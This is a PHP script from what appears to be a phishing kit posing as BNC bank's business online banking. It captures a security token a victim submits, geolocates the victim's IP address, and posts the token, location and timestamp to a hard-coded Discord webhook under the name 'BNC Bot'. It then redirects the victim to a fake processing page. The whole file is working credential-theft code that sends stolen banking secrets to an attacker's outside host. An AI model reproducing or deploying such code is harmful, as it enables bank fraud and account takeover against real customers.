<?php
session_start();

$_SESSION['autenticado'] = true;

$token  = isset($_POST['token_bnc']) ? trim($_POST['token_bnc']) : 'No especificada';

$_SESSION['token_bnc'] = $token;

function getUserIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ipList = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        return trim($ipList[0]);
    } else {
        return $_SERVER['REMOTE_ADDR'];
    }
}

$ip = getUserIP();

$detalle_ip = @file_get_contents("http://ip-api.com/json/$ip");
$detalle_ip = json_decode($detalle_ip, true);

$country = $region = $city = "Desconocido";
if ($detalle_ip && $detalle_ip['status'] === 'success') {
    $country = $detalle_ip['country'];
    $region  = $detalle_ip['regionName'];
    $city    = $detalle_ip['city'];
}

$uniqueId = strtoupper(substr(md5($ip), 0, 4));
$mapLink  = "https://www.google.com/maps/search/?api=1&query=$ip";

$data = [
    "content" => "🔑 **TOKEN BNC** 🔑",
    "embeds" => [
        [
            "title" => "CUENTA EMPRESAS (BNCNET)🔑",
            "color" => 3447003,
            "fields" => [
                [
                    "name" => "🔑 Token:",
                    "value" => $token,
                    "inline" => true
                ],
                [
                    "name" => "📌 IP:",
                    "value" => $ip,
                    "inline" => false
                ],
                [
                    "name" => "📍 Ciudad:",
                    "value" => $city,
                    "inline" => true
                ],
                [
                    "name" => "🗺️ Región:",
                    "value" => $region,
                    "inline" => true
                ],
                [
                    "name" => "🌎 País:",
                    "value" => $country,
                    "inline" => true
                ],
                [
                    "name" => "📅 Fecha:",
                    "value" => date('d-m-Y H:i:s'),
                    "inline" => false
                ],
                [
                    "name" => "#️⃣ ID de Usuario:",
                    "value" => "#$uniqueId",
                    "inline" => false
                ]
            ]
        ]
    ],
    "username" => "BNC Bot"
];

$webhookUrl = "https://discordapp.com/api/webhooks/1378240261703864380/RiVDS5zNfExao4T-2eT2vyAG7YcJxmiftA_b7k5R_43yv_HDtNTYmEYV6VkytUIwn5Py";

$options = [
    "http" => [
        "header"  => "Content-Type: application/json\r\n",
        "method"  => "POST",
        "content" => json_encode($data)
    ]
];

$context = stream_context_create($options);
@file_get_contents($webhookUrl, false, $context);

header("Location: ../procesando-token.php");
exit;
?>
